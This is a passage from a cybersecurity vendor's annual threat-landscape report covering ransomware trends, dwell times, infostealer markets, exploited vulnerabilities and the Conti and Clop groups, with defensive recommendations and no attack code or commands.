# State of the Threat: A Year in Review (7th Edition)

**Organization:** Secureworks  
**Report Title:** State of the Threat  
**Year:** 2023  

---

## Table of Contents
- [Letter From Our Vice President, Threat Research](#letter-from-our-vice-president-threat-research)
- [Executive Summary and Key Findings](#executive-summary-and-key-findings)
  - [Key Findings](#key-findings)
- [The Business of Cybercrime—Is Boomtime Back?](#the-business-of-cybercrimeis-boomtime-back)
  - [Name-and-Shame Sites Reveal the Most Active Ransomware Groups](#name-and-shame-sites-reveal-the-most-active-ransomware-groups)
  - [Assessing the Size of the Ransomware Problem](#assessing-the-size-of-the-ransomware-problem)
  - [Dwell Times Are Dropping for Ransomware Attacks](#dwell-times-are-dropping-for-ransomware-attacks)
  - [The Top Initial Access Vectors for Ransomware](#the-top-initial-access-vectors-for-ransomware)
  - [Opening the Valves on the Infostealer Data to Threat Actor Pipeline](#opening-the-valves-on-the-infostealer-data-to-threat-actor-pipeline)
  - [Scan-and-Exploit—Why Patching Pays](#scan-and-exploitwhy-patching-pays)
  - [Data Leak-Only Attacks—What's the Impact?](#data-leak-only-attackswhats-the-impact)
  - [GOLD TAHOE Has Two Strings to Its Bow](#gold-tahoe-has-two-strings-to-its-bow)
  - [The Conti Implosion—The Hydra is Dead but Its Limbs Survive](#the-conti-implosionthe-hydra-is-dead-but-its-limbs-survive)
  - [Ransomware—Why Some Groups Stay the Course and Others Fall at the First Hurdle](#ransomwarewhy-some-groups-stay-the-course-and-others-fall-at-the-first-hurdle)
  - [Fighting Back, but With How Much Impact?](#fighting-back-but-with-how-much-impact)
  - [Genesis Market's Temporary Exodus](#genesis-markets-temporary-exodus)
  - [What Made Genesis Market So Popular?](#what-made-genesis-market-so-popular)
  - [BreachForums Breached](#breachforums-breached)
  - [Hive Ransomware Infrastructure Hived Off](#hive-ransomware-infrastructure-hived-off)
  - [TrickBot Members Sanctioned](#trickbot-members-sanctioned)
  - [Romcom RAT Blurs the Lines](#romcom-rat-blurs-the-lines)

---

## Letter From Our Vice President, Threat Research

The war in Ukraine continues to dominate the headlines, both in terms of kinetic military action and of hostile pro-Russia cyber activity. It is not surprising that Russian state-sponsored threat actor groups persist in conducting attacks against targets in Ukraine and in countries that have vocally supported Ukraine in the conflict.

For the first few months after Russia's invasion of Ukraine on February 24, 2022, it looked as if an unexpected but welcome victim of the war might be the cybercrime ecosystem, as the number of successful ransomware attacks dropped.

Eighteen months on, that optimism appears short lived.

Ransomware attack numbers have rapidly returned to and then exceeded normal levels over the period of this report. Some well-known ransomware operator names remain highly active, and new groups are joining the fray too. Other threat actors have also continued to concern our customers, from business email compromise attackers to Chinese cyberespionage groups, to North Korean attackers focused on cryptocurrency theft.

The Secureworks® Counter Threat Unit™ (CTU) gathers the data obtained from the trillions of events processed by our Taegis™ XDR platform. We combine it with insights from engagements carried out by the Secureworks Incident Response team, dynamic threat emulation activities, extensive monitoring of the Dark Web and underground forums, coupled with proactive research into cyberattacks to create a unique view of the threat landscape. All these data points then feed back into Taegis, creating a virtuous circle that further combines with the wealth of human expertise we offer to help keep our customers safe.

This report distills our findings to share with you, drawing and building on the specialist threat intelligence we have published to our customers over the period this report covers. It specifically focuses on how threat actor behavior has evolved over the past twelve months, both in terms of tooling and tactics.

We hope the information presented here proves both an interesting and useful part of your security journey.

Sincerely,

**Don Smith**  
Vice President, Threat Research  
Secureworks  

---

## Executive Summary and Key Findings

Over the past year, both cybercriminal and state-sponsored threat actors have maintained high levels of activity, meaning that the threat level to businesses remains as elevated as ever. The range of threats remains broad, from the temporary nuisance of hacktivist denial of service attacks to wiper attacks or IP theft and other types of cyberespionage, from business email compromise to data exfiltration attacks or business-threatening ransomware attacks. Precursor cyber activity continues at scale, delivering the malware that makes many of these cyberattacks, particularly ransomware attacks, easier and faster to carry out.

Amidst all this, Secureworks® Counter Threat Unit™ (CTU) researchers continue to track these threats and use their knowledge and expertise to develop insights into this activity. These insights feed into published threat intelligence and provide the indicators and technical content that allows us to create countermeasures that provide protection for Secureworks' customers.

This report synthesizes and presents our findings for the period July 2022 to June 2023.

### Key Findings

1. **Ransomware continues to be the primary threat facing organizations**, because of the scope of disruption it can cause and its prevalence. Attack numbers returned to and then exceeded historical norms, after last year's brief slowdown following the invasion of Ukraine. Average dwell times between initial access and ransomware payload delivery have dropped significantly to a median figure of just 24 hours. 2023 may be the most prolific year for ransomware attacks to date.
2. **Supply chain attacks on and through suppliers provide threat actors with maximum impact for effort expended.** Threat actors as diverse as North Korean state-sponsored groups and ransomware operators have conducted notable supply chain attacks over the past year, leveraging initial victims to gain access to their customers.
3. **Infostealer activity has also increased, associated in large part with use by ransomware affiliates.** Stolen credentials now vie with scan-and-exploit as some of the most significant precursors of ransomware attacks. On a single day on one underground marketplace, as many as seven million infostealer logs were available for sale, well over twice as many as on the same day last year. The case for organizations to monitor underground forums for stolen data is clear.
4. **Drive-by downloads are becoming increasingly popular as a malware delivery method** and over the past year have surged in use as an initial access vector for ransomware. Two major strains of malware delivered this way are Gootloader and SocGholish, often via compromised websites.
5. **Microsoft's disabling by default of macros in documents from the internet has forced threat actors to innovate in how they deliver malware.** Use of malicious Microsoft OneNote files and container file types such as ISO grew to compensate during the year.
6. **Regular and timely patching remains as essential as ever in preventing threat actors from compromising networks.** Both state-sponsored threat groups and cybercriminals make wide use of scan-and-exploit to commence their attacks, making exploited vulnerabilities one of the most frequently observed initial access vectors.
7. **State-sponsored threat activity remains driven by political imperatives.** Russia's primary focus is the war in Ukraine, North Korea's is currency theft, Iran's is suppression of opposition, and China's is cyberespionage. However, regional focuses are, in some cases, starting to shift, particularly on the part of China, which is closely monitoring the impact of the war on Ukraine on other European nations.
8. **Artificial intelligence (AI) is a supporting tool to existing threat actors, rather than a new class of threat.** To date, phishing lures and Telegram bots remain the major tangible evidence of use of AI by threat actors. However, the level of interest that threat actors are showing suggests that they may soon develop more complex and dangerous applications.

---

## The Business of Cybercrime—Is Boomtime Back?

Over the past year, the number of victims named on ransomware leak sites returned to normal levels (after the brief dip in early 2022[^1]) and then continued to grow to reach unprecedented heights. The last four months have proved the most fertile in terms of victim numbers since name-and-shame emerged.

![Figure 1: Ransomware name-and-shame leak site victim listings from 2020 to 2023. Monthly volume comparison showing an upward spike in 2022-23 starting in March and surpassing 500 listings by June.](figure1.png)  
*Figure 1. Ransomware name-and-shame leak site victim listings—2020 to 2023. (Source: Secureworks)*

It is tempting to conclude that business is booming, although leak sites only list victims who have not paid the ransom, so an entirely accurate picture is not possible. However, we should not forget that spikes of anomalous activity on the part of a few highly impactful groups may to an extent be skewing the figures, as shown in figure 2.

![Figure 2: Victim count by scheme per month from July 2022 to August 2023, illustrating counts across schemes including LockBit, BlackCat/ALPHV, CL0P, BianLian, Black Basta, Royal, PLAY, 8BASE, MalasLocker, Akira, Karakurt, Vice Society, Medusa, Hive, Snatch, STORMOUS, AvosLocker, BlackByte, RansomHouse, NoEscape, Ragnar_Locker, Qilin, LV, Mallox, Lorenz, Cloak, Cuba, Quantum, Everest, z6wkg, Cactus, Trigona, Donut, Endurance, Sparta, Metaencryptor, Bl00dy, D0N#T (Donut Leaks), Medusa Locker, IceFire, Unsafe, CryptOn, DAIXIN, DarkPower, DarkRace, RansomEXX, Nokoyawa, MONTI, Industrial Spy, SiegedSec, Cyclops, RedAlert, Onyx, Project Relic, Rhysida, Ransomed, 0mega, BLACK SUIT, RA GROUP, Rancoz, RansomedVC, CipherLocker, Dunghill Leak, INC Ransom, REvil, Sodinokibi (REvil), Vendetta, VSOP (Onyx), CryptNet, CrossLock, Money Message, and Yanluowang.](figure2.png)  
*Figure 2. Victim count by scheme per month. (Source: Secureworks)*

---

### Name-and-Shame Sites Reveal the Most Active Ransomware Groups

At current rates of victim naming, 2023 is on course to be the most prolific year since name-and-shame attacks began in 2019. It is likely that the 10,000th victim name will be posted to leak sites by late summer 2023.\*

\* *The 10,000th name-and-shame ransomware victim name was posted to the BlackCat/ALPHV leak site in mid-August.*

However, one-off mass exploitations of specific vulnerabilities explain why March (Fortra GoAnywhere, exploited by Clop operator GOLD TAHOE[^2]), May (Zimbra mail server, exploited by MalasLocker) and June 2023 (MOVEit Transfer, exploited by GOLD TAHOE) saw the highest ever monthly number of victims named.

The same threat groups continued to dominate in 2023—GOLD MYSTIC's LockBit again remains the head of the pack but GOLD BLAZER's BlackCat/ALPHV, Clop, GOLD SOUVENIR's Royal, BianLian, PLAY and GOLD REBELLION's Black Basta all feature in the ten most active groups.

LockBit operator GOLD MYSTIC and its broad and loosely managed pool of affiliates continue to deploy LockBit ransomware prolifically. Once again in 2022/23, it tops the ratings for most active group, this time with nearly three times the number of victims of the next most active group, ALPHV(BlackCat), operated by GOLD BLAZER.

![Figure 3: Bar chart showing name-and-shame victims listed per year (July-June): 3,698 victims in 2020-21; 5,088 victims in 2021-22; and 6,342 victims in 2022-23.](figure3.png)  
*Figure 3. Name-and-shame victims listed per year July-June. (Source: Secureworks)*

However, new schemes have also posted numerous victims: MalasLocker, 8BASE and Akira all emerged only in May 2023. 8BASE listed nearly 40 victims on its leak site during June 2023, only slightly fewer than LockBit. Analysis indicates it posted a dump of victims going as far back as mid-2022 all at the same time.

MalasLocker attacks, targeting Zimbra servers from the end of March 2023[^3] and listed on their leak site in May, accounted for at least 171 victims. This provides just one illustration of how valuable scan-and-exploit (where threat actors use search engines to identify vulnerable systems) can be as a tactic for ransomware groups.

![Figure 4: Bar chart of the 20 most active name-and-shame ransomware groups by victims listed between July 2022 and June 2023: LockBit (984), ALPHV/BlackCat (355), CL0P (207), BianLian (202), Royal (197), Black Basta (195), MalasLocker (171), PLAY (143), 8BASE (108), Karakurt (90), Vice Society (90), Hive (78), Medusa (65), Akira (56), AvosLocker (55), Snatch (51), STORMOUS (46), BlackByte (45), RansomHouse (43), and LV (30).](figure4.png)  
*Figure 4. The 20 most active name-and-shame ransomware groups by victims listed between July 2022 and June 2023. (Source: Secureworks)*

---

### Assessing the Size of the Ransomware Problem

Accurately assessing the scale of the ransomware problem is challenging. Leak sites only touch on a fraction of the problem and not all ransomware groups operate leak sites. New ransomware variants launch regularly. Without a leak site, it is very difficult to judge how active they are.

The primary purpose of leak sites is to encourage currently recalcitrant victims to pay. Therefore, they only show the names of victims who are yet to pay a ransom. As such, they cannot be considered an accurate record of any specific group's activity. Nor are they an indication of the overall impact of ransomware.

Historic data from ransomware group takedowns or collapses indicate that leak sites only reveal a small percentage of overall attacks. For example, Hive's leak site listed 150 organizations, likely accounting for around 10 percent of their overall victim count of 1,500. Avaddon listed just 180 victims, a small fraction of the nearly 3,000 decryption keys the group released when it shuttered the operation. It is difficult to assess how representative these examples are.

To extrapolate, we would need to know how successful each group's leak site is and what the likelihood of payment by a victim once they have been named is. It may not be outlandish to assume that the vast majority of “successful” ransomware operations occur without the victim's name ever reaching the leak site—that is where the incentive to pay lies, with the victim motivated to prevent public disclosure.

Leak sites generally do not reveal whether ransomware was deployed. And we can't draw conclusions about how effective or impactful a ransomware deployment was, and whether the victim did not pay because the impact was low, or because the data stolen was inconsequential.

Name-and-shame statistics are useful for some things. They show how particular variants emerge onto the scene and how they grow and shrink in usage. But how reliable are they as indicators of impact? Without knowing how many victims pay the ransom, we can't determine how successful any particularly variant is in terms of payment to victim ratio. Leak site data should therefore be used with caution. In aggregate though it is clear from the continued activity that ransomware and data-theft extortion remain a viable criminal business model and a substantial threat to businesses.

---

### Dwell Times Are Dropping for Ransomware Attacks

Despite the increasing threat posed by ransomware attacks, in many cases early detection and response thwarts attackers from progressing to ransomware deployment. Because of this, our incident responders frequently discover ransomware precursor activity without evidence of damaging system encryption events.

However, there have been some interesting trends over the past year in those attacks where ransomware is deployed. Most notably, the dwell time—the time between gaining access to a network and executing the ransomware—has significantly reduced compared to previous years.

> **24 hours**  
> Average (median) dwell time for ransomware actors

- In just over ten percent of cases, we saw ransomware deployed within five hours of initial access.
- Nearly two-thirds of attacks were carried out inside one single day, nearly four fifths within one week.
- In around a fifth of attacks, the threat actor sat on the network for longer than a week before deploying ransomware.
- Of those, three-quarters continued to sit on the network for over a month.

Notably, the median dwell time in ransomware engagements dropped to just under 24 hours from 4.5 days in the previous year and 5.5 days in the year before that.

Importantly, the incident response engagements that provided the data used to make this calculation featured a broad range of 18 different ransomware variants. This means that the data was not skewed by a prevalence of variants that are known typically to be deployed very quickly, such as Phobos ransomware. The dwell times in engagements where exfiltration of data was observed were generally longer, but this is not universally true; in some engagements involving Black Basta, Hive, and AvosLocker—all double extortion ransomware schemes—we observed data exfiltration and ransomware deployment taking place more quickly than the median dwell time of 24 hours.

So why are threat actors executing their ransomware attacks so much more quickly? CTU researchers have observed that ransomware intrusions have become less complex. Threat actors are not conducting the same operations more quickly. Instead, they are conducting simpler operations. Devastating enterprise-wide encryption events, which are more difficult to execute and take longer to carry out, are now rarer than in previous years.

One driver for this is likely the need to reduce dwell time to lower the chance of detection. The cybersecurity industry is undoubtedly getting better at detecting the activity that has historically preceded ransomware, such as the use of offensive security toolkits like Cobalt Strike. This may be a factor in forcing ransomware operators to work more quickly.

However, it is also likely that the threat actors now deploying ransomware are just lower skilled than previous operators. The introduction of the RaaS model lowered the bar to entry, introducing playbooks for affiliates to use, and allowed it to scale significantly as a result.

Arguably, this represents a commodification of the ransomware landscape, with scheme operators reducing the cost of operations in order to increase volume. This can be seen in the sheer number of victims named on name-and-shame leak sites. But it is also reflected in the “quality” of ransomware operations. This might provide one reason why fewer victims are reported[^4] to be paying ransoms (although such reports may not give a full picture, given the fracturing of the ransomware landscape and the increasing difficulties in reliably identifying cryptocurrency wallets).

This absolutely does not imply that ransomware can now be ignored as a threat. Even a limited distribution on a victim's network can be highly damaging. Hitting a single server in a production environment, for example, might be enough to take business operations offline for enough time to cause significant financial impact. And ransomware operators and their affiliates are aware of this. The increased take-up of virtualized environments, now often crucial to many companies' IT infrastructures, makes them a viable target. More and more ransomware schemes now have Linux-compatible variants, created to target VMware ESXi hosts. Threat actors have an incentive to spend minimal time on a likely-monitored Windows system before moving to encrypt hundreds of virtual disks on a single VMware ESXi host.

Dwell times can vary considerably case by case. In July 2022, in an incident involving the financially motivated GOLD TOMAHAWK threat group (also known as Karakurt), Secureworks incident responders identified 29 hosts and 10 user accounts compromised by the threat actor. Over 300GB of compressed data was exfiltrated from two of these hosts. The attacker had remained on the network for as long as six weeks before incident responders were engaged, navigating across multiple hosts in different countries possibly to locate data to steal. The unusually long dwell time included a three-week hiatus from malicious activity.

In contrast, in April 2023, Secureworks incident responders investigated an incident where an organization that did not use Secureworks managed services experienced an intrusion where, within a single 24-hour period, two different ransomware variants, Buhti and AvosLocker, were deployed.

---

### The Top Initial Access Vectors for Ransomware

Scan-and-exploit and stolen credentials were the two largest initial access vectors used by threat actors in the ransomware attacks Secureworks investigated, each accounting for approximately 32 percent of intrusions. These figures are consistent with the top IAVs for all incident response engagements over the same period but represent a change relative to ransomware engagements in the previous twelve months. This is the period covered in last year's State of the Threat report, when scan-and-exploit at 52 percent accounted for many more ransomware intrusions than the next nearest IAV, stolen credentials, at 39 percent.

Secureworks incident responders also investigated several intrusions where threat actors used the Qakbot malware to deliver Cobalt Strike, which then led to Black Basta ransomware deployment. These incidents were notable due to the speed of the operations: again, data exfiltration and ransomware deployment occurred within 24 hours of initial access.

> #### Ransomware Initial Access Vectors
> The three largest initial access vectors (IAVs) observed during ransomware engagements where customers engaged Secureworks incident responders were:
> - **Scan-and-exploit**—32 percent
> - **Stolen credentials**—32 percent
> - **Commodity malware delivered via phishing emails**—14 percent
> 
> Each of these IAVs can either be prevented or detected at an early stage before ransomware is deployed, using a combination of prompt and regular patching, multi-factor authentication, and comprehensive implementing of monitoring solutions.

The most likely enabler of the rise in the use of stolen credentials as an IAV is the explosion in infostealer activity. Infostealers are a type of malware that can pilfer sensitive information such as login credentials, session cookies and tokens, financial details, and personal data from compromised computers and networks. Once installed via methods such as phishing attacks, infected websites, and malicious software downloads, they can execute and exit very quickly, sometimes in less than a minute of total runtime. The data is then packaged and sold as “logs.” Each log contains data taken by the infostealer from a compromised user machine.

![Figure 5: Diagram illustrating 'What's in a log?' showing an infostealer log containing: local application data (crypto wallets, VPN data), system documents, network information, software information (credentials), and web browser data (visited domains, cookies, tokens).](figure5.png)  
*Figure 5. What's in a log? (Source: Secureworks)*

Threat actors use these stolen credentials to gain unauthorized access to enterprise networks via remote access services such as virtual private networks (VPNs) and Microsoft Office Web Access (OWA). This unauthorized access can form an early stage in the exfiltration of sensitive data or the deployment of ransomware. As a result, infostealers are a significant type of intrusion precursor malware and a contributory factor to attacks that often happens outside protective corporate controls.

---

### Opening the Valves on the Infostealer Data to Threat Actor Pipeline

Initial access using stolen credentials accounted for up to 32 percent of the ransomware incident response engagements we handled in the last year. Credentials can be obtained via a variety of means, including phishing emails that lead victims to credential harvesting websites, or through previous breaches.

However, in the past year, there has been a significant increase in the use of infostealers to obtain credentials. A thriving market clearly exists, and new infostealers are regularly developed and put up for sale to meet this demand.

Russian Market remains by far the most prolific marketplace[^5] for infostealer logs. On a single day in June 2022, there were 2.9 million logs advertised for sale. A year later, that figure has ballooned to over 7 million, over 2.4 times as many, and a notable increase on the five million that were available on a single day in late February 2023. Other markets include 2easy and Genesis Market, and there is also a significant level of trade via certain Telegram channels.

![Figure 6: Screenshot of a threat actor Telegram channel listing logs, prices, discounts, and daily deals for stolen logs.](figure6.png)  
*Figure 6. Threat actor Telegram channel listing logs prices and deals. (Source: Secureworks)*

Buyers on these marketplaces are likely discerning, seeking out logs containing credentials to particularly high-value organizations before making a purchase. However, CTU researchers have observed that the bulk of logs available for purchase contain credentials for systems like social media platforms and common webmail services. These are not likely to be of great value to ransomware operators specifically looking to extort organizations. This means that the majority of available stock likely consists of a large number of older logs deemed of limited value to users.

However, sometimes there are rich pickings to be had. In October 2022, we observed a vendor on an underground forum auctioning access to a home PC belonging to an employee of a global brand in the food and drink industry. According to the seller, virtual network computing (VNC) credentials and cookies harvested from the employee's personal computer facilitated access to a corporate dashboard and the user's Outlook inbox. This could allow a threat actor to conduct reconnaissance, pivot deeper into the network, conduct phishing attacks, or deploy ransomware.

![Figure 7: Underground forum post advertising unauthorized corporate network access obtained via an employee's personal computer.](figure7.png)  
*Figure 7. Underground forum post advertising access to corporate resources via a personal computer. (Source: Secureworks)*

Home devices have provided fertile ground for infostealers over the past year. Based on posts observed by CTU researchers, most devices infected with an infostealer were running Windows 7 Home or Windows 10 Home operating systems. Typically, home computers also have weaker security controls than corporate-managed devices. CTU researchers expect to see an increase in the volume of corporate credentials stolen from compromised personal devices for abuse as an initial access vector for ransomware and other malicious activity. Limiting how employees access company resources from personally owned devices can greatly reduce the enterprise's risk from infostealers.

Over the past year, Russian Market also added a pre-order function to its website, enabling buyers to request logs by domain or type. It is not clear whether this functionality has been widely taken up, but the development implies that buyers can effectively pay sellers to target specific organizations or services.

The development of new infostealer malware advertised for sale on underground forums also occurs at speed. In 30 days through May and June 2023, we saw 12 new infostealers made available for purchase or rent on underground forums. Once advertised, they are tested and reviewed by forum users. Their developers rely on positive feedback for success and not all will become widely used.

Although the use of these tools to harvest credentials is clearly widespread, firm evidence connecting specific stealers to specific compromises is scant. This is likely to be down to two key factors: one, if credentials are used in a compromise, their origin is rarely made clear and two, the time delay between them being collected by an infostealer and used in an intrusion is likely to be significant, and certainly well beyond the scope of most incident response engagements.

Credentials go for a premium on underground forums and marketplaces because it is highly likely they are used to facilitate cybercrime-related intrusions, including ransomware. The time lapse between theft and use further shows the value for organizations of monitoring forums for stolen data.

![Figure 8: Promotional extract from a cybercriminal advertisement on an underground forum for the Meduza Stealer.](figure8.png)  
*Figure 8. Extract from an advertisement for the Meduza Stealer. (Source: Secureworks)*

---

### Scan-and-Exploit—Why Patching Pays

Scan-and-exploit, where threat actors use search engines like Shodan to identify vulnerable systems, can lead to spikes in attack activity by specific groups, and even anomalistic peaks in name-and-shame ransomware activity. MalasLocker ransomware listed 171 victims on their leaksite by exploiting Zimbra servers vulnerable to CVE-2022-27924, a cross-site scripting (XSS) flaw impacting Zimbra Collaboration Suite 8.8.15. Clop operator GOLD TAHOE specializes in acquiring and exploiting specific vulnerabilities in file transfer solutions (see the section later in the report) to impact maximum numbers of victims.

Initial access broker GOLD MELODY has also favored scanning internet-facing servers to identify and exploit vulnerabilities to opportunistically compromise networks. In August 2022, Secureworks incident responders worked on an engagement where the group likely exploited a Log4j vulnerability (CVE-2021-4104) to compromise an organization's internet-facing Flexera FlexNet server.

Chinese ransomware group[^6] BRONZE STARLIGHT also uses scan-and-exploit attacks to target unpatched internet-facing servers. For example, in August 2022, CTU researchers observed BRONZE STARLIGHT compromising an organization's vulnerable internet-facing ManageEngine server. Other state-sponsored groups depend on scan-and-exploit too, for example China's BRONZE ATLAS and Iran's COBALT MIRAGE.

The easy availability of information about vulnerable servers can even see multiple threat actors compromising a network using the same vulnerability, at the same time or in quick succession.

The annual listing of top routinely exploited vulnerabilities published by CISA and partner agencies lists top vulnerabilities that threat actors scan for. Frequently, this list contains older vulnerabilities. Of the top 12 vulnerabilities exploited during 2022 listed in the roundup[^7] for the year, seven have CVE dates of earlier than 2022. One, CVE-2018-13379, a path traversal vulnerability in Fortinet FortiOS and FortiProxy, also made the top 15 routinely exploited list in 2021 and in 2020.

While organizations should always prioritize their patching schedule according to their individual risk profile, the vulnerabilities listed in these reports likely remain at high risk of exploitation.

---

### Data Leak-Only Attacks—What's the Impact?

Despite initial questions about whether threat actors would find data leak-only extortion a lucrative endeavor, threat groups that specialize in this type of attack continue their activities. Karakurt, thought to be a spin-off of the now defunct Conti ransomware operation, persists in regularly naming victims on its leak site at an average of seven a month. And arguably the biggest ransomware event of the last year—the exploitation of a zero-day vulnerability in the MOVEit Transfer file management software—did not involve actual ransomware at all. GOLD TAHOE continue a long-term trend of targeting such utilities to steal data and hold it to ransom, naming many hundreds of alleged victims on its Clop leak site.

---

### GOLD TAHOE Has Two Strings to Its Bow

The GOLD TAHOE threat group, operator of Clop ransomware and the Clop Leaks site, has been around for over a decade. Its members have worked with GOLD DRAKE (EvilCorp, Dridex), GOLD BLACKBURN (TrickBot), GOLD NIAGARA (FIN7), and other well-known threat groups. Perhaps because of these connections, GOLD TAHOE does not openly communicate on any criminal forums. And while the group does not operate its ransomware as a RaaS, it does appear to rely on another group, GOLD NIAGARA, to deliver its ransomware in a private arrangement.

But the Clop ransomware itself tells only half of the story. While the leak site the group has operated since August 2020 lists victims of its ransomware operations, it also carries the names of those targeted in its attempts at data theft-only extortion. There are many more names of the latter type than there are of the former; Clop ransomware deployments account for around a quarter of listed victims, while the data theft-only operation features the remainder. And the bulk of those are from two campaigns from 2023. By exploiting zero-day vulnerabilities in two file management services—Fortra's GoAnywhere MFT in March and Progress Software's MOVEit Transfer application in May—the group claims to have successfully stolen data from over three hundred victims and possibly as many as six hundred. It is not possible to gauge exactly how many were affected given that the victims named on leak sites constitute those who have not paid the ransom.

Such activity for a ransomware group is unusual, but it forms the most recent chapter in its exploitation of vulnerabilities to steal and ransom victim data. Since late 2020, the group has sought to exploit both zero-day and N-day vulnerabilities in file management applications to extort the users of such services. Their use of zero-day vulnerabilities is notable, and shows how well-resourced the group is—zero-days are expensive to develop or procure, and were historically the domain of state-sponsored actors.

![Figure 9: Timeline of services exploited by GOLD TAHOE in attacks on file transfer solutions: December 2020 (Accellion FTA zero-days CVE-2021-27101 and CVE-2021-27104), January 2021 (Accellion FTA zero-days CVE-2021-27103 and CVE-2021-27102), July 2021 (SolarWinds Serv-U CVE-2021-35211 previously exploited by Chinese APT), March 2023 (GoAnywhere MFT CVE-2023-0669 zero-day), and May 2023 (MOVEit Transfer CVE-2023-34362 zero-day).](figure9.png)  
*Figure 9. Services exploited by GOLD TAHOE in attacks on file transfer solutions. (Source: Secureworks)*

Exploiting these services gives the group access to shared files, some of which may come from third parties, as for example in the Zellis payroll compromise[^8] which formed part of the MOVEit Transfer attacks. And while there is little an organization can do to prevent a breach of a trusted third-party, especially through the abuse of a zero-day vulnerability in the vendor's platform, there are some steps organizations can take to detect and mitigate the threat posed by GOLD TAHOE:

- Enforce a retention policy on shared files to ensure data is available for only as long as it is needed.
- Protect highly sensitive data (like PII) with file level encryption that requires a key that is not stored on the file sharing service. If a platform does not support such a facility, it may not be the best method of sharing this type of data.
- Encrypt data in transit and at rest.
- Enable alerting that indicates when files are being accessed and monitor for anomalies.
- Implement auditing so that if a breach occurs it can be quickly determined what files were present during relevant time period(s).
- For on-premises solutions, implement network flow monitoring to detect and alert on large data transfers.

---

### The Conti Implosion—The Hydra is Dead but Its Limbs Survive

The most obvious impact of the conflict in Ukraine on the cybercrime ecosystem was the implosion in the first half of 2022 of GOLD ULRICK, the group behind Conti ransomware. The revelations in the Conti Leaks—a large disclosure of information about the group's activity, likely by a Ukrainian affiliate angered at the group's almost immediate declaration of support for Russia's invasion—preceded the disappearance of Conti ransomware by a few months.

While the full reasons for its dissolution remain unclear, it is likely that affiliates were concerned about damage to the Conti name that might make it harder for victims to pay. GOLD ULRICK may also have been disconcerted by the U.S. Department of State announcing[^9] in May 2022 a $10 million reward for information leading to the identification or location of key leaders behind the Conti ransomware operation. Such unwanted scrutiny may have also been a cause for the group's disappearance.

However, that did not mean that group members remained absent from the ransomware ecosystem for long. Unlike previous disruptions to ransomware activities that have resulted in rebrands, such as Darkside's rebranding as BlackMatter, the group instead apparently turned to other existing operations. As a result, Conti members and affiliates began to work with other ransomware groups.

One affiliate was observed going on to work with LockBit, Suncrypt and Monti ransomware operations after Conti's demise. The apparent leader of the Conti ransomware operation—revealed as “Stern” in the Conti chat logs—was subsequently observed[^10] transacting with Quantum, Karakurt, Diavol, and Royal ransomware schemes. Other schemes, such as BlackBasta and Nokoyawa, have also been linked[^11] to former Conti operators.

These observations demonstrate adaptability within a broad network of criminals, whose relationships allow for cooperation to meet common ends. The ransomware ecosystem is not made up of monolithic units that operate within their own closed spheres. The ransomware-as-a-service model allows individuals to work with any scheme, and it is likely that, through this process, strong working relationships have been built that can be relied on when operations are disrupted.

---

### Ransomware—Why Some Groups Stay the Course and Others Fall at the First Hurdle

Tor is littered with ransomware group leak sites that never list more than a few victims. Groups with three or fewer victim listings in the past year include Vendetta, Dunghill Leak, and CrossLock. What makes some groups successful, and others a flash in the pan?

To survive and flourish in a competitive market and to avoid disruption, ransomware operators and their affiliates need to walk a fine line between impact and scrutiny. They need victims to pay; their ability to take business operations offline and steal data that the victim does not want to be made public are crucial elements of that. They also want victims to know that they are serious and that paying them will likely result in a successful outcome. This builds reputation. But the more effective they become, the more scrutiny they face from government agencies and law enforcement operations.

Although issues of jurisdiction remain a challenge, law enforcement has clearly demonstrated an ability in recent years to disrupt if not prosecute ransomware operators and their affiliates. They recovered stolen funds[^12] in 2021 following the Darkside Colonial Pipeline attack, issued sanctions[^13] in February 2023 against individuals engaged in TrickBot and Conti ransomware operations, and infiltrated[^14] the Hive ransomware operation and took its infrastructure offline.

As a result, many groups publicly ban the targeting of critical national infrastructure, government organizations and the healthcare and education verticals in the hope of avoiding scrutiny. For example, following their widescale exploitation of the MOVEit Transfer zero-day vulnerability to steal data from multiple victims, Clop operator GOLD TAHOE announced[^15] they had deleted data related to any “government, city or police service.” Despite this, they have listed public sector victims on their leak site from several countries.

Operating a private ransomware group or exercising tight control over affiliates makes avoiding certain victims in this way much easier to achieve than it can be in less rigidly managed organizations. For example, GOLD MYSTIC's loosely managed affiliate model—delegating the responsibility of victim selection, ransom negotiation and payment distribution to the affiliate—bring considerable advantages in terms of scale, something that the number of LockBit attacks every month demonstrates. However, it also means that some affiliates may behave in ways that bring unwanted attention.

In December 2022, after a LockBit affiliate targeted a children's hospital in Toronto, Canada, an apology was posted[^16] to the leak site and a free decryptor was allegedly provided to enable the hospital to recover files and access. GOLD MYSTIC also claimed to have banned the affiliate from working again with the group. In a further example, LockBitSupp, the self-proclaimed leader of GOLD MYSTIC, appeared unaware that Royal Mail had been attacked by LockBit until the organization's name appeared on the LockBit leak site.

However, some groups are simply less scrupulous—Vice Society, operated by GOLD VICTOR, specialized in targeting education and healthcare organizations until it became dormant in late June 2023, and then possibly returned[^17] as Rhysida ransomware, which also targets healthcare and education.

Ransomware groups also need to be adaptable to survive and prosper. There has been an increase in the number of ransomware groups with Linux variants that are designed to encrypt VMware ESXi hosts. Third-party reports suggest that ransomware operations with such variants now include Royal, Black Basta, LockBit, BlackMatter, AvosLocker, REvil, HelloKitty, RansomEXX, and MichaelKors, as well as multiple lower profile variants[^18] based on the Babuk ESXi source code leaked in September 2021. One example is the ESXiArgs ransomware[^19] operation, which in early 2023 used scan-and-exploit to conduct a wave of ransomware attacks targeting an OpenSLP heap-overflow vulnerability (CVE-2021-21974) in VMware ESXi hypervisors. Both the French and Italian cyber security agencies issued advisories, with reports that approximately 3,200 VMware ESXi servers worldwide were compromised in this campaign. This is despite a patch being available since February 23, 2021. ESXiArgs ransomware has been observed only partially encrypting files larger than 128MB. Smaller files are fully encrypted.

Reasons for this spate of new variants appear based on the perception that ESXi environments are in general less well protected and instrumented than Windows environments. The impact of encrypting a single ESXi host can also be significant, depending on how an organization's virtualized environment is set up.

In the past year, Secureworks incident responders have worked on multiple ransomware attacks affecting VMware ESXi servers conducted by ransomware groups including LockBit, ESXiArgs, and ALPHV(BlackCat). However, despite attempts by LockBit to launch a macOS encryptor, post-intrusion ransomware aimed at the macOS environment remains rare.

---

### Fighting Back, but With How Much Impact?

The emphasis placed in 2021 by the Biden-Harris administration on combatting cybercrime and other threat actor activity has continued throughout the reporting period. Both U.S. law enforcement and other government agencies, and international partners, have maintained a relatively high tempo of activity, with website seizures, sanctions, arrest warrants, and more.

